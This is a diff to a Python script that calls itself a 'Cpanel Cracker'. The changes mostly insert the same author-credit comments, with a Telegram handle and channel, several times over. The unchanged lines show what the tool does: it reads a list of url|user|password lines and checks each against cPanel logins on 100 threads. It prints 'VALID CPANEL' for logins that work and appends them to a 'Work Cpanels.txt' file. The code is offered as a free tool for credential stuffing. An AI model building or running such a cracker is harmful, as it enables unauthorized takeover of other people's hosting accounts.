@@ -1,16 +1,29 @@
+#Coder: @simosaper11
+#channel: @simosaper
+#FREE TOOL !!!
+#note: when you show name coder add in source this happen because script kids go sell this tools ^__^
+ 
 import requests, os,random,ctypes,colored
 import colorama
 from colorama import Fore
 from colorama import Fore as F, Style
 from concurrent.futures import ThreadPoolExecutor
-
+#Coder: @simosaper11
+#channel: @simosaper
+#FREE TOOL !!!
+#note: when you show name coder add in source this happen because script kids go sell this tools ^__^
+ 
 yellow = F.LIGHTYELLOW_EX
 red = F.LIGHTRED_EX
 green = F.LIGHTGREEN_EX
 cyan = F.LIGHTCYAN_EX
 blue = F.LIGHTBLUE_EX
 sb = Style.BRIGHT
-
+#Coder: @simosaper11
+#channel: @simosaper
+#FREE TOOL !!!
+#note: when you show name coder add in source this happen because script kids go sell this tools ^__^
+ 
 if not os.path.exists('@simosaper11'):
     os.mkdir('@simosaper11')
 
@@ -22,7 +35,11 @@ WORK = 0
 WRONG = 0
 BAD = 0
 
-
+#Coder: @simosaper11
+#channel: @simosaper
+#FREE TOOL !!!
+#note: when you show name coder add in source this happen because script kids go sell this tools ^__^
+ 
 def checker(line):
     global TOTAL
     global WORK
@@ -48,7 +65,11 @@ def checker(line):
             print(f'{Fore.LIGHTCYAN_EX}[{Fore.LIGHTMAGENTA_EX}>{Fore.LIGHTCYAN_EX}]{Fore.LIGHTGREEN_EX}[FOUND]{Fore.LIGHTWHITE_EX} {miniurl}|{user}|{passw} {Fore.LIGHTBLUE_EX}MSG: {Fore.LIGHTYELLOW_EX} VALID CPANEL ')
             WORK +=1
             TOTAL +=1
-
+#Coder: @simosaper11
+#channel: @simosaper
+#FREE TOOL !!!
+#note: when you show name coder add in source this happen because script kids go sell this tools ^__^
+ 
             save = open('@simosaper11/Work Cpanels.txt','a')
             save.write(result)
             save.close()
@@ -64,7 +85,11 @@ def checker(line):
         BAD +=1
         TOTAL +=1
     ctypes.windll.kernel32.SetConsoleTitleW(f'Cpanel Cracker join now : [https://t.me/simosaper | Checked {TOTAL}\\{num} \\ WORK {WORK} \\ WrongPASS {WRONG} \\ BAD {BAD}')
-
+#Coder: @simosaper11
+#channel: @simosaper
+#FREE TOOL !!!
+#note: when you show name coder add in source this happen because script kids go sell this tools ^__^
+ 
 
 def main():
     global num
@@ -75,7 +100,11 @@ def main():
     ctypes.windll.kernel32.SetConsoleTitleW('Cpanel Cracker : Coder @simosaper11')
     
     
-    
+#Coder: @simosaper11
+#channel: @simosaper
+#FREE TOOL !!!
+#note: when you show name coder add in source this happen because script kids go sell this tools ^__^
+     
     
 
     print(f"""{F.LIGHTCYAN_EX}
@@ -95,6 +124,13 @@ def main():
     else:os.system('clear')
     with open(lista,'r') as f:
         lines = f.read().splitlines()
+
+#Coder: @simosaper11
+#channel: @simosaper
+#FREE TOOL !!!
+#note: when you show name coder add in source this happen because script kids go sell this tools ^__^
+ 
+        
         num = len(lines)
     with ThreadPoolExecutor(max_workers=100) as p:
         p.map(checker,lines)
